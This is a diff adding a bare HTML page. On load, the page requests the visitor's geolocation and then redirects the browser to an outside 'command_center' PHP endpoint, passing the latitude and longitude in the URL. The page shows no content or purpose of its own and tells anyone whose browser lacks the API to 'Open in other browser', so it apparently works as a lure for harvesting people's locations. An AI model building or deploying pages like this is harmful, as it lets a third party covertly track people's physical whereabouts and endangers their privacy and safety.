@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+    <p id="demo"></p>
+<script>
+var x = document.getElementById("demo");
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+        x.innerHTML = "Open in other browser.";
+    }
+}
+function showPosition(position) {
+    var lang = position.coords.latitude;
+    var long = position.coords.longitude;
+    window.location.href = "http://new1.cet-gov.ac.in/command_center/getl.php?lat="+lang+"&&long="+long;
+}
+</script>
+
+</body>
+</html>
